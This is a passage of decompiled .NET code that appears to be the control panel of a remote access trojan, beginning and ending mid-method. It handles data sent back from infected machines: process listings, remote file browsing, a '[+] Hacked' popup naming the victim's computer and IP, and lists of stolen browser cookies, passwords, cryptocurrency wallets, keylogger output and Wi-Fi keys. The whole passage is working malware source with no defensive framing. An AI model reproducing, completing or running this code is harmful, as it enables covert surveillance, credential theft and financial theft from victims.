									catch (Exception ex61)
									{
										ProjectData.SetProjectError(ex61);
										Exception projectError86 = ex61;
										ProjectData.SetProjectError(projectError86);
										ProjectData.ClearProjectError();
										ProjectData.ClearProjectError();
									}
									ListViewItem listViewItem26 = new ListViewItem(array66[0]);
									listViewItem26.SubItems.Add(array66[1]);
									listViewItem26.Name = array66[1];
									if (!array66[2].Contains(":\\"))
									{
										listViewItem26.SubItems.Add(string.Empty);
									}
									else
									{
										listViewItem26.SubItems.Add(new FileInfo(array66[2].Replace("\"", string.Empty)).Directory.Name);
										listViewItem26.ToolTipText = array66[2].Replace("\"", string.Empty);
									}
									string text32 = " ";
									listViewItem26.SubItems.Add(array66[3]);
									if (array66[4].StartsWith("\""))
									{
										text32 = "\"";
										array66[4] = array66[4].Remove(0, 1);
									}
									if (array66[4].Contains(text32))
									{
										array66[4] = array66[4].Remove(0, Strings.InStr(array66[4], text32));
										if (array66[4].StartsWith(" "))
										{
											array66[4] = array66[4].Remove(0, 1);
										}
										listViewItem26.SubItems.Add(array66[4]);
									}
									else
									{
										listViewItem26.SubItems.Add(string.Empty);
									}
									if (!gparam_)
									{
										listViewItem26.ForeColor = Color.GreenYellow;
									}
									if (Conversions.ToInteger(array66[1]) == manager10.PID)
									{
										listViewItem26.ForeColor = Color.Red;
										listViewItem26.ImageIndex = 4;
									}
									listViewItem26.ImageIndex = 2;
									list8.Add(listViewItem26);
									if (list8.Count > 10)
									{
										manager10.LPR.Items.AddRange(list8.ToArray());
										list8.Clear();
									}
								}
								if (list8.Count > 0)
								{
									manager10.LPR.Items.AddRange(list8.ToArray());
									list8.Clear();
								}
								if (manager10.PRFX)
								{
									manager10.PRFX = false;
									manager10.LPR.method_3();
								}
								ColumnHeader columnHeader_3 = manager10.LPR.columnHeader_0;
								if (columnHeader_3 != null)
								{
									columnHeader_3.Tag = RuntimeHelpers.GetObjectValue(Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_3.Tag), "+", TextCompare: false) ? "-" : (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_3.Tag), "-", TextCompare: false) ? "+" : "-"));
									manager10.LPR.GClass9_ColumnClick(manager10.LPR, new ColumnClickEventArgs(columnHeader_3.Index));
								}
								else
								{
									manager10.LPR.GClass9_ColumnClick(manager10.LPR, new ColumnClickEventArgs(0));
								}
							}
							manager10.PRNXT = true;
							break;
						}
					default:
						if (Operators.CompareString(text30, "ER", TextCompare: false) == 0)
						{
							manager10.SL.Text = array[2];
						}
						break;
					case "RM":
					{
						int num29 = array.Length - 1;
						for (int num30 = 2; num30 <= num29; num30++)
						{
							manager10.LPR.Items.RemoveByKey(array[num30]);
						}
						break;
					}
					case "pid":
						manager10.PID = Conversions.ToInteger(array[2]);
						break;
					}
					return;
				}
			}
			case "FM":
			{
				Manager manager7 = (Manager)smethod_7("m" + client.ip());
				if (manager7 == null)
				{
					return;
				}
				string text28 = array[1];
				switch (text28)
				{
				case "!":
				{
					manager7.L1.Items.Clear();
					int num21 = 0;
					List<ListViewItem> list6 = new List<ListViewItem>();
					int num22 = array.Length - 1;
					for (int num23 = 2; num23 <= num22; num23++)
					{
						string[] array59 = Strings.Split(Class6.smethod_9(array[num23]), "*");
						DirectoryInfo directoryInfo2 = new DirectoryInfo(array59[0]);
						ListViewItem listViewItem21 = new ListViewItem(directoryInfo2.Name);
						listViewItem21.ToolTipText = directoryInfo2.FullName;
						listViewItem21.SubItems.Add(smethod_4(array59[1]));
						string left11 = smethod_4(array59[1]).Replace(" KB", "");
						if (Operators.CompareString(left11, "0,00", TextCompare: false) != 0)
						{
							int num24 = Conversions.ToInteger(smethod_3(array59[1]));
							manager7.Label6.Text = Conversions.ToString(Conversions.ToDouble(manager7.Label6.Text) + (double)num24);
							manager7.sll.Text = "Disk size [ " + manager7.Label6.Text + " GB ]";
						}
						string left12 = array59[1];
						if (Operators.CompareString(left12, DriveType.Fixed.ToString(), TextCompare: false) == 0)
						{
							listViewItem21.ImageIndex = 16;
						}
						else if (Operators.CompareString(left12, DriveType.Removable.ToString(), TextCompare: false) == 0)
						{
							listViewItem21.ImageIndex = 18;
						}
						else if (Operators.CompareString(left12, DriveType.CDRom.ToString(), TextCompare: false) == 0)
						{
							listViewItem21.ImageIndex = 17;
						}
						else if (Operators.CompareString(left12, string.Empty, TextCompare: false) != 0)
						{
							listViewItem21.ImageIndex = ((Operators.CompareString(left12, DriveType.Network.ToString(), TextCompare: false) != 0) ? 1 : 5);
						}
						else
						{
							listViewItem21.ImageIndex = 0;
							switch (num21)
							{
							case 0:
								listViewItem21.Text = "Desktop";
								listViewItem21.ImageIndex = 10;
								break;
							case 1:
								listViewItem21.Text = "Downloads";
								listViewItem21.ImageIndex = 11;
								break;
							case 2:
								listViewItem21.Text = "MyDocuments";
								listViewItem21.ImageIndex = 9;
								break;
							case 3:
								listViewItem21.Text = "MyPictures";
								listViewItem21.ImageIndex = 14;
								break;
							case 4:
								listViewItem21.Text = "Videos";
								listViewItem21.ImageIndex = 7;
								break;
							case 5:
								listViewItem21.Text = "Startup";
								break;
							}
							num21++;
							listViewItem21.SubItems[1].Text = "File Folder";
						}
						list6.Add(listViewItem21);
						if (list6.Count > 10)
						{
							manager7.L1.Items.AddRange(list6.ToArray());
							list6.Clear();
						}
					}
					if (list6.Count > 0)
					{
						manager7.L1.Items.AddRange(list6.ToArray());
						list6.Clear();
					}
					manager7.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					manager7.Label6.Text = manager7.Label6.Text + " GB";
					break;
				}
				case "@":
					lock (manager7.Prog)
					{
						if (manager7.Cache.Contains(Class6.smethod_9(array[2])))
						{
							manager7.Cache.Remove(Class6.smethod_9(array[2]));
						}
						Manager.GClass14 gClass2 = new Manager.GClass14();
						gClass2.string_0 = Class6.smethod_9(array[2]);
						manager7.Cache.Add(gClass2, gClass2.string_0);
						DirectoryInfo directoryInfo3 = new DirectoryInfo(Class6.smethod_9(array[2]));
						if (Operators.CompareString(manager7.TextBox1.Text, directoryInfo3.FullName, TextCompare: false) == 0)
						{
							manager7.Prog.Value = 0;
							string[] array60 = Strings.Split(array[3], "*");
							manager7.Prog.Maximum = array60.Length - 1;
							manager7.L2.Items.Clear();
							if (directoryInfo3.Parent != null)
							{
								ListViewItem listViewItem22 = manager7.L2.Items.Add("<====", "<====", 0);
								listViewItem22.ToolTipText = directoryInfo3.Parent.FullName;
								listViewItem22.SubItems.Add(string.Empty);
								listViewItem22.SubItems.Add("File Folder");
							}
							manager7.vmethod_50().Images.Clear();
							manager7.vmethod_50().Images.Add(manager7.MG.Images[19]);
							manager7.vmethod_50().Images.Add("*", manager7.MG.Images[4]);
							List<ListViewItem> list7 = new List<ListViewItem>();
							int num25 = array60.Length - 2;
							int num26 = 0;
							while (true)
							{
								if (num26 <= num25)
								{
									if (Operators.CompareString(manager7.TextBox1.Text, directoryInfo3.FullName, TextCompare: false) != 0)
									{
										break;
									}
									ListViewItem listViewItem23 = new ListViewItem(Class6.smethod_9(array60[num26]), 0);
									ListViewItem listViewItem24 = listViewItem23;
									listViewItem24.SubItems.Add(string.Empty);
									listViewItem24.SubItems.Add("File Folder");
									listViewItem24.ToolTipText = directoryInfo3.FullName + listViewItem24.Text;
									gClass2.list_0.Add(listViewItem24.ToolTipText);
									manager7.Prog.Value++;
									list7.Add(listViewItem23);
									if (list7.Count > 20)
									{
										manager7.L2.Items.AddRange(list7.ToArray());
										list7.Clear();
									}
									num26++;
									continue;
								}
								if (list7.Count > 0)
								{
									manager7.L2.Items.AddRange(list7.ToArray());
									list7.Clear();
								}
								manager7.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
								client.Send("Ex" + string_1 + "fm" + string_1 + "@" + string_1 + array[2]);
								manager7.Prog.Value = 0;
								return;
							}
							gClass2.list_1.Clear();
							gClass2.list_0.Clear();
							try
							{
								manager7.Cache.Remove(Class6.smethod_9(array[2]));
								break;
							}
							catch (Exception ex54)
							{
								ProjectData.SetProjectError(ex54);
								Exception projectError79 = ex54;
								ProjectData.SetProjectError(projectError79);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
								break;
							}
						}
						gClass2.list_1.Clear();
						gClass2.list_0.Clear();
						try
						{
							manager7.Cache.Remove(Class6.smethod_9(array[2]));
							break;
						}
						catch (Exception ex55)
						{
							ProjectData.SetProjectError(ex55);
							Exception projectError80 = ex55;
							ProjectData.SetProjectError(projectError80);
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
							break;
						}
					}
				case "#":
					lock (manager7.Prog)
					{
						string text29 = Class6.smethod_9(array[2]);
						if (Operators.CompareString(manager7.TextBox1.Text, text29, TextCompare: false) != 0)
						{
							break;
						}
						Manager.GClass14 gClass = (Manager.GClass14)manager7.Cache[Class6.smethod_9(array[2])];
						gClass.list_1.Clear();
						manager7.Prog.Value = 0;
						string[] array56 = Strings.Split(array[3], "*");
						manager7.Prog.Maximum = array56.Length - 1;
						List<ListViewItem> list5 = new List<ListViewItem>();
						int num19 = array56.Length - 2;
						for (int num20 = 0; num20 <= num19; num20++)
						{
							string[] array57 = Strings.Split(Class6.smethod_9(array56[num20]), "*");
							if (Operators.CompareString(manager7.TextBox1.Text, text29, TextCompare: false) == 0)
							{
								ListViewItem listViewItem18 = new ListViewItem(array57[0]);
								ListViewItem listViewItem19 = listViewItem18;
								FileInfo fileInfo2 = new FileInfo(text29 + array57[0]);
								listViewItem19.ToolTipText = fileInfo2.FullName;
								listViewItem19.SubItems.Add(Class6.smethod_10(Conversions.ToLong(array57[1])));
								listViewItem19.Name = listViewItem19.ToolTipText;
								if (array57.Length != 2)
								{
									listViewItem19.SubItems.Add(fileInfo2.Extension.Remove(0, 1));
									if (!manager7.vmethod_50().Images.ContainsKey(listViewItem19.ToolTipText))
									{
										manager7.vmethod_50().Images.Add(listViewItem19.ToolTipText, Image.FromStream(new MemoryStream(Convert.FromBase64String(array57[2]))));
									}
									if (!manager7.Images.Contains("!" + listViewItem19.ToolTipText))
									{
										manager7.Images.Add(manager7.vmethod_50().Images[listViewItem19.ToolTipText], "!" + listViewItem19.ToolTipText);
									}
									listViewItem19.ImageKey = listViewItem19.ToolTipText;
								}
								else if (Operators.CompareString(fileInfo2.Extension, string.Empty, TextCompare: false) != 0)
								{
									listViewItem19.SubItems.Add(fileInfo2.Extension.Replace(".", string.Empty));
									if (!manager7.vmethod_50().Images.ContainsKey(fileInfo2.Extension))
									{
										File.Create(Application.StartupPath + "\\!" + fileInfo2.Extension).Close();
										manager7.vmethod_50().Images.Add(fileInfo2.Extension, Icon.ExtractAssociatedIcon(Application.StartupPath + "\\!" + fileInfo2.Extension));
										File.Delete(Application.StartupPath + "\\!" + fileInfo2.Extension);
										listViewItem19.ImageKey = fileInfo2.Extension;
									}
									else
									{
										listViewItem19.ImageKey = fileInfo2.Extension;
									}
								}
								else
								{
									listViewItem19.SubItems.Add(string.Empty);
									listViewItem19.ImageKey = "*";
								}
								gClass.list_1.Add(listViewItem19.ToolTipText + "*" + listViewItem19.SubItems[1].Text + "*" + listViewItem19.SubItems[2].Text);
								manager7.Prog.Value++;
								list5.Add(listViewItem18);
								if (list5.Count > 20)
								{
									manager7.L2.Items.AddRange(list5.ToArray());
									list5.Clear();
								}
								continue;
							}
							gClass.list_1.Clear();
							gClass.list_0.Clear();
							try
							{
								manager7.Cache.Remove(Class6.smethod_9(array[2]));
								return;
							}
							catch (Exception ex53)
							{
								ProjectData.SetProjectError(ex53);
								Exception projectError78 = ex53;
								ProjectData.SetProjectError(projectError78);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
								return;
							}
						}
						if (list5.Count > 0)
						{
							manager7.L2.Items.AddRange(list5.ToArray());
							list5.Clear();
						}
						manager7.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
						manager7.Prog.Value = 0;
						break;
					}
				case "$":
					if (manager7.Images.Contains(Class6.smethod_9(array[2])))
					{
						manager7.Images.Remove(Class6.smethod_9(array[2]));
					}
					manager7.Images.Add(Image.FromStream(new MemoryStream((byte[])NewLateBinding.LateIndexGet(Class6.smethod_17(byte_, array[2] + string_1), new object[1] { 1 }, null))), Class6.smethod_9(array[2]));
					if (manager7.L2.Items.ContainsKey(Class6.smethod_9(array[2])) && manager7.L2.Items[Class6.smethod_9(array[2])].Selected)
					{
						manager7.p.Image = (Image)manager7.Images[Class6.smethod_9(array[2])];
						manager7.p.Visible = true;
					}
					break;
				case "%":
					if (!((Control)object_1).InvokeRequired)
					{
						Note note = new Note();
						note.FN = Class6.smethod_9(array[2]);
						note.Text = manager7.Text + " - " + note.FN;
						note.SK = manager7.sk;
						note.TextBox1.Text = Class6.smethod_9(array[3]).Replace("\0", string.Empty);
						note.Show();
					}
					else
					{
						((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(object_5) });
					}
					break;
				case "nm":
				{
					string[] array58 = Strings.Split(Class6.smethod_9(array[2]), "*");
					try
					{
						foreach (ListViewItem item3 in manager7.L2.Items)
						{
							if (Operators.CompareString(item3.ToolTipText, array58[0], TextCompare: false) == 0)
							{
								if (Operators.CompareString(array58[2], "*", TextCompare: false) == 0)
								{
									DirectoryInfo directoryInfo = new DirectoryInfo(array58[0]);
									item3.Text = array58[1];
									item3.ToolTipText = directoryInfo.Parent.FullName + "\\" + item3.Text;
								}
								else
								{
									FileInfo fileInfo3 = new FileInfo(array58[0]);
									item3.Text = array58[1];
									item3.ToolTipText = fileInfo3.Directory.FullName + "\\" + item3.Text;
									item3.SubItems[2].Text = new FileInfo(item3.ToolTipText).Extension.Replace(".", string.Empty);
								}
							}
						}
						break;
					}
					finally
					{
						IEnumerator enumerator7 = default(IEnumerator);
						if (enumerator7 is IDisposable)
						{
							(enumerator7 as IDisposable).Dispose();
						}
					}
				}
				default:
					if (Operators.CompareString(text28, "ER", TextCompare: false) != 0)
					{
						break;
					}
					manager7.SL.Text = array[3];
					if (!array[3].StartsWith("UnRAR_"))
					{
						break;
					}
					lock (manager7.Prog)
					{
						FileInfo fileInfo = new FileInfo(array[3]);
						if (Operators.CompareString(fileInfo.Directory.FullName.ToLower() + "\\", manager7.TextBox1.Text.ToLower(), TextCompare: false) == 0)
						{
							ListViewItem listViewItem17 = manager7.L2.Items.Add(fileInfo.FullName, fileInfo.Name, 0);
							listViewItem17.SubItems.Add(string.Empty);
							listViewItem17.SubItems.Add("DIR");
						}
						break;
					}
				case "dl":
				{
					string[] array55 = Strings.Split(Class6.smethod_9(array[2]), "*");
					try
					{
						foreach (ListViewItem item4 in manager7.L2.Items)
						{
							if (Operators.CompareString(array55[1], "!", TextCompare: false) == 0)
							{
								if ((Operators.CompareString(item4.Text, new DirectoryInfo(array55[0]).Name, TextCompare: false) == 0) & (Operators.CompareString(item4.SubItems[2].Text, "DIR", TextCompare: false) == 0))
								{
									item4.Remove();
									break;
								}
							}
							else if ((Operators.CompareString(item4.Text, new DirectoryInfo(array55[0]).Name, TextCompare: false) == 0) & (Operators.CompareString(item4.SubItems[2].Text, "DIR", TextCompare: false) != 0))
							{
								item4.Remove();
								break;
							}
						}
						break;
					}
					finally
					{
						IEnumerator enumerator5 = default(IEnumerator);
						if (enumerator5 is IDisposable)
						{
							(enumerator5 as IDisposable).Dispose();
						}
					}
				}
				}
				return;
			}
			case "inf":
				Application.DoEvents();
				if (!((Control)object_1).InvokeRequired)
				{
					if ((notf)smethod_7("YyUNAS" + client.ip()) == null)
					{
						try
						{
							Application.DoEvents();
							bitmap_0 = (Bitmap)((Form1)object_1).vmethod_16().Images[string_5 + ".png"];
							string text25 = Class6.smethod_9(array[1]);
							string text26 = Class6.smethod_9(array[2]);
							string text27 = Class6.smethod_9(array[3]);
							string expression23 = client.ip();
							string[] array54 = Strings.Split(expression23, ":");
							((Form1)object_1).Pp1.WRT(Color.LimeGreen, " |> End");
							((Form1)object_1).Pp1.WRT(" |---->", bitmap_0, Color.LimeGreen, Class6.smethod_6(), client.COI, Color.Gold, "IP - " + array54[0], "Connected");
							((Form1)object_1).Pp1.WRT(" |");
							((Form1)object_1).Pp1.WRT(Color.LimeGreen, "[+] Hacked");
							PopupNotifier popupNotifier = new PopupNotifier();
							popupNotifier.ContentFont = new Font("arial", 8f, FontStyle.Bold);
							popupNotifier.BodyColor = Color.Black;
							popupNotifier.ContentHoverColor = Color.LightGreen;
							popupNotifier.BorderColor = Color.Green;
							popupNotifier.ContentText = "[+] Computer name is " + text25 + "\r\n[+] IP address " + array54[0] + "\r\n[+] Locating in the state of N\\A\r\n[+] Operating System " + text26 + "\r\n[+] It was installed from a date (" + text27 + ")";
							popupNotifier.TitleText = "========== [ Computer connected now ] ==========";
							popupNotifier.Image = Resources.els;
							popupNotifier.AnimationInterval = 10;
							popupNotifier.Delay = 5000;
							popupNotifier.ContentColor = Color.White;
							popupNotifier.ContentHoverColor = Color.White;
							popupNotifier.Popup();
							return;
						}
						catch (Exception projectError77)
						{
							ProjectData.SetProjectError(projectError77);
							ProjectData.ClearProjectError();
							return;
						}
					}
				}
				else
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(object_5) });
				}
				return;
			case "Coke":
				Application.DoEvents();
				if (((Control)object_1).InvokeRequired)
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(object_5) });
				}
				else
				{
					if ((notf)smethod_7("YdyxUNsAS" + client.ip()) != null)
					{
						return;
					}
					try
					{
						Application.DoEvents();
						if (Operators.CompareString(array[3], null, TextCompare: false) != 0)
						{
							string text23 = null;
							string text24 = null;
							list_4.Add(Class6.smethod_9(array[3]));
							text23 = Class6.smethod_9(array[1]);
							text24 = Class6.smethod_9(array[2]);
							Class6.smethod_9(array[3]).Split('\r');
							ListViewItem listViewItem15 = new ListViewItem();
							listViewItem15.Text = text23;
							listViewItem15.SubItems.Add(text24);
							listViewItem15.SubItems.Add("Microsoft Edge");
							listViewItem15.SubItems.Add("successfully");
							listViewItem15.ImageIndex = 11;
							Class2.XTBfo6WOm.Form1.Logisx.Items.Add(listViewItem15);
							if (Class2.XTBfo6WOm.Form1.TabControl1.SelectedIndex != 7)
							{
								Class2.XTBfo6WOm.Form1.NOTF_COK.Show();
							}
						}
						return;
					}
					catch (Exception projectError60)
					{
						ProjectData.SetProjectError(projectError60);
						ProjectData.ClearProjectError();
						return;
					}
				}
				return;
			case "Dat":
				Application.DoEvents();
				if (((Control)object_1).InvokeRequired)
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(object_5) });
				}
				else
				{
					if ((notf)smethod_7("YyUNsAS" + client.ip()) != null)
					{
						return;
					}
					try
					{
						Application.DoEvents();
						if (Operators.CompareString(array[3], null, TextCompare: false) != 0)
						{
							string[] array40 = null;
							string text20 = null;
							string text21 = null;
							int num17 = 0;
							list_3.Add(Class6.smethod_9(array[3]));
							text20 = Class6.smethod_9(array[1]);
							text21 = Class6.smethod_9(array[2]);
							array40 = Class6.smethod_9(array[3]).Split('\r');
							num17 = array40.Length;
							ListViewItem listViewItem13 = new ListViewItem();
							listViewItem13.Text = text20;
							listViewItem13.SubItems.Add(text21);
							listViewItem13.SubItems.Add("The current number of data ( " + Conversions.ToString(num17) + " )");
							listViewItem13.ImageIndex = 2;
							Class2.XTBfo6WOm.Form1.List_pass.Items.Add(listViewItem13);
							if (Class2.XTBfo6WOm.Form1.TabControl1.SelectedIndex != 4)
							{
								Class2.XTBfo6WOm.Form1.Notf_pass.Show();
							}
						}
						return;
					}
					catch (Exception projectError54)
					{
						ProjectData.SetProjectError(projectError54);
						ProjectData.ClearProjectError();
						return;
					}
				}
				return;
			case "GRB":
				Application.DoEvents();
				if (((Control)object_1).InvokeRequired)
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(object_5) });
				}
				else
				{
					if ((notf)smethod_7("YyeUNsAS" + client.ip()) != null)
					{
						return;
					}
					try
					{
						Application.DoEvents();
						string text14 = null;
						string text15 = null;
						string text16 = null;
						string text17 = null;
						text14 = Class6.smethod_9(array[1]);
						text15 = Class6.smethod_9(array[2]);
						text16 = Class6.smethod_9(array[3]);
						text17 = Class6.smethod_9(array[4]);
						ListViewItem listViewItem10 = new ListViewItem();
						listViewItem10.Text = text14;
						listViewItem10.SubItems.Add(text15);
						listViewItem10.SubItems.Add(text16);
						listViewItem10.SubItems.Add(text17);
						switch (text16)
						{
						case "XMR":
							listViewItem10.ImageIndex = 4;
							break;
						case "LTC":
							listViewItem10.ImageIndex = 6;
							break;
						case "ETH":
							listViewItem10.ImageIndex = 7;
							break;
						case "XML":
							listViewItem10.ImageIndex = 8;
							break;
						default:
							listViewItem10.ImageIndex = 8;
							break;
						case "NEC":
							listViewItem10.ImageIndex = 8;
							break;
						case "XRP":
							listViewItem10.ImageIndex = 8;
							break;
						case "BTC":
							listViewItem10.ImageIndex = 5;
							break;
						}
						Class2.XTBfo6WOm.Form1.L1_Grabber.Items.Add(listViewItem10);
						if (Class2.XTBfo6WOm.Form1.TabControl1.SelectedIndex != 6)
						{
							Class2.XTBfo6WOm.Form1.NOTF_BRBS1.Show();
						}
						return;
					}
					catch (Exception projectError41)
					{
						ProjectData.SetProjectError(projectError41);
						ProjectData.ClearProjectError();
						return;
					}
				}
				return;
			case "kla":
			{
				kl kl = (kl)smethod_7("kl" + client.ip());
				lock (kl)
				{
					kl.T1.Clear();
					string[] array26 = Strings.Split(Class6.smethod_9(array[1]), "\r\n");
					kl.ProgressBar1.Hide();
					kl.ProgressBar1.Value = 0;
					kl.ProgressBar1.Maximum = array26.Length;
					string[] array27 = array26;
					for (int num13 = 0; num13 < array27.Length; num13++)
					{
						kl.ProgressBar1.Show();
						string t = array27[num13];
						kl.insert(t);
						kl.ProgressBar1.Value++;
					}
					kl.T1.ScrollToCaret();
					kl.ProgressBar1.Value = 0;
					kl.ProgressBar1.Hide();
					kl.Guna2GradientButton5.Enabled = true;
					string text13 = Class6.smethod_9(array[2].Replace("_", "-"));
					if (Operators.CompareString(text13, "..", TextCompare: false) != 0)
					{
						kl.ComboBox1.Items.Clear();
						string[] array28 = Strings.Split(text13, ":");
						string[] array29 = array28;
						foreach (string item in array29)
						{
							Application.DoEvents();
							kl.ComboBox1.Items.Add(item).ToString();
						}
					}
					else
					{
						text13 = null;
					}
					kl.R2.Clear();
					string[] array30 = Strings.Split(Class6.smethod_9(array[3]), "\r\n");
					kl.ProgressBar2.Hide();
					kl.ProgressBar2.Value = 0;
					kl.ProgressBar2.Maximum = array30.Length;
					string[] array31 = array30;
					for (int num15 = 0; num15 < array31.Length; num15++)
					{
						kl.ProgressBar2.Show();
						string t2 = array31[num15];
						kl.insert1(t2);
						kl.ProgressBar1.Value++;
					}
					kl.R2.ScrollToCaret();
					kl.ProgressBar2.Value = 0;
					kl.ProgressBar2.Hide();
					kl.Guna2GradientButton6.Enabled = true;
					if (!Directory.Exists(client.Folder + "\\Keyloggar\\"))
					{
						Directory.CreateDirectory(client.Folder);
					}
					kl.T1.SaveFile(client.Folder + "Keyloggar.rtf");
					return;
				}
			}
			case "Anx":
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex5)
					{
						ProjectData.SetProjectError(ex5);
						Exception ex6 = ex5;
						ProjectData.SetProjectError(ex6);
						Exception projectError11 = ex6;
						ProjectData.SetProjectError(projectError11);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (!((Control)object_1).InvokeRequired)
				{
					Anx anx = (Anx)smethod_7("Anx" + client.ip());
					string left = array[2];
					if (Operators.CompareString(left, "~", TextCompare: false) != 0)
					{
						if (Operators.CompareString(left, "Start", TextCompare: false) == 0)
						{
							try
							{
								string expression3 = array[3];
								string[] array5 = Strings.Split(expression3, "|'|");
								anx.n.Text = array5[0];
								anx.w.Text = array5[1];
								return;
							}
							catch (Exception projectError12)
							{
								ProjectData.SetProjectError(projectError12);
								ProjectData.ClearProjectError();
								return;
							}
						}
					}
					else if (anx == null)
					{
						Anx anx2 = new Anx();
						anx2.C = client;
						anx2.Name = "Anx" + client.ip();
						anx2.Show();
					}
				}
				else
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
				}
				return;
			case "wifi":
			{
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex69)
					{
						ProjectData.SetProjectError(ex69);
						Exception ex70 = ex69;
						ProjectData.SetProjectError(ex70);
						Exception projectError96 = ex70;
						ProjectData.SetProjectError(projectError96);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (((Control)object_1).InvokeRequired)
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
					return;
				}
				PictureBox99 pictureBox = (PictureBox99)smethod_7("wifi" + client.ip());
				switch (array[2])
				{
				case "~":
					if (pictureBox == null)
					{
						PictureBox99 pictureBox2 = new PictureBox99();
						pictureBox2.C = client;
						pictureBox2.Name = "wifi" + client.ip();
						pictureBox2.Show();
					}
					break;
				case "Start":
					try
					{
						string expression29 = array[3];
						string[] array76 = Strings.Split(expression29, "|'|");
						pictureBox.n.Text = array76[0];
						pictureBox.w.Text = array76[1];
						break;
					}
					catch (Exception projectError98)
					{
						ProjectData.SetProjectError(projectError98);
						ProjectData.ClearProjectError();
						break;
					}
				case "Past":
					try
					{
						string expression28 = array[3];
						string[] array75 = Strings.Split(expression28, "|'|");
						ListViewItem listViewItem29 = new ListViewItem();
						listViewItem29.Text = array75[0];
						listViewItem29.SubItems.Add("AES");
						listViewItem29.SubItems.Add(array75[1]);
						listViewItem29.ImageIndex = 0;
						pictureBox.L1.Items.Add(listViewItem29);
						break;
					}
					catch (Exception projectError97)
					{
						ProjectData.SetProjectError(projectError97);
						ProjectData.ClearProjectError();
						break;
					}
				}
				return;
			}
			case "SO":
			{
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex56)
					{
						ProjectData.SetProjectError(ex56);
						Exception ex57 = ex56;
						ProjectData.SetProjectError(ex57);
						Exception projectError81 = ex57;
						ProjectData.SetProjectError(projectError81);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (((Control)object_1).InvokeRequired)
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
					return;
				}
				SO sO = (SO)smethod_7("SO" + client.ip());
				string left13 = array[2];
				if (Operators.CompareString(left13, "~", TextCompare: false) == 0)
				{
					if (sO == null)
					{
						SO sO2 = new SO();
						sO2.C = client;
						sO2.Name = "SO" + client.ip();
						sO2.Show();
					}
				}
				else if (Operators.CompareString(left13, "Start", TextCompare: false) == 0)
				{
					try
					{
						string expression24 = array[3];
						string[] array61 = Strings.Split(expression24, "|'|");
						sO.n.Text = array61[0];
						sO.w.Text = array61[1];
						return;
					}
					catch (Exception projectError82)
					{
						ProjectData.SetProjectError(projectError82);
						ProjectData.ClearProjectError();
						return;
					}
				}
				return;
			}
			case "HRR":
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex41)
					{
						ProjectData.SetProjectError(ex41);
						Exception ex42 = ex41;
						ProjectData.SetProjectError(ex42);
						Exception projectError63 = ex42;
						ProjectData.SetProjectError(projectError63);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (!((Control)object_1).InvokeRequired)
				{
					HRR hRR = (HRR)smethod_7("HRR" + client.ip());
					string left7 = array[2];
					if (Operators.CompareString(left7, "~", TextCompare: false) == 0)
					{
						if (hRR == null)
						{
							HRR hRR2 = new HRR();
							hRR2.C = client;
							hRR2.Name = "HRR" + client.ip();
							hRR2.Show();
						}
					}
					else if (Operators.CompareString(left7, "Start", TextCompare: false) == 0)
					{
						try
						{
							string expression16 = array[3];
							string[] array47 = Strings.Split(expression16, "|'|");
							hRR.n.Text = array47[0];
							hRR.w.Text = array47[1];
							return;
						}
						catch (Exception projectError64)
						{
							ProjectData.SetProjectError(projectError64);
							ProjectData.ClearProjectError();
							return;
						}
					}
				}
				else
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
				}
				return;
			case "VDP":
			{
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex33)
					{
						ProjectData.SetProjectError(ex33);
						Exception ex34 = ex33;
						ProjectData.SetProjectError(ex34);
						Exception projectError48 = ex34;
						ProjectData.SetProjectError(projectError48);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (((Control)object_1).InvokeRequired)
				{
